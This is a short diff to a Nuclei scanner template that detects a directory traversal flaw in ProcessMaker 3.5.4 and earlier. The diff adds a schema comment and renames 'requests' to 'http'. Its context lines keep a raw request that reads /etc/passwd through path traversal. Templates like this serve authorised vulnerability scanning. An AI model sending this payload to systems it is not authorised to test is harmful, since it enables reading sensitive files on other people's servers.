@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: processmaker-lfi
 info:
   name: ProcessMaker <= 3.5.4 Directory Traversal
@@ -8,7 +9,7 @@ info:
     - https://www.exploit-db.com/exploits/50229
     - https://www.processmaker.com
   tags: processmaker,lfi
-requests:
+http:
   - raw:
       - |
         GET /../../../..//etc/passwd HTTP/1.1
